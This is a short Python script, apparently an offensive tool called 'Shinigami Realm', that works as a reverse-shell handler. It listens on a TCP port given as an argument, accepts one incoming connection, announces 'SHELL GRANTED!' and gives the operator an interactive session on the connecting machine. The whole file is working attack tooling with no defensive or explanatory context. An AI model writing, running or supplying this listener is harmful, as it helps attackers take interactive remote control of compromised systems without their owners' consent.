#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, telnetlib, sys, os
from colorama import Fore

def clear():
    os.system("clear")

def banner():
    r = Fore.RED
    w = Fore.WHITE
    g = Fore.GREEN
    lb = Fore.LIGHTBLUE_EX
    print(f''' 
        {r}Shinigami{w} Realm
        \n\n\n''')

def handler(port):
    r = Fore.RED
    w = Fore.WHITE
    g = Fore.GREEN
    lb = Fore.LIGHTBLUE_EX
    clear()
    banner()
    print(f"[{lb}?{w}] Starting handler on {port}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',port))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[{g}+{w}] Received Connection from {addr[0]}!")
    t.sock = conn
    print(f"[{lb}?{w}] Take thy shell.. [SHELL GRANTED!]")
    t.interact()

port = int(sys.argv[1])
handler(port)
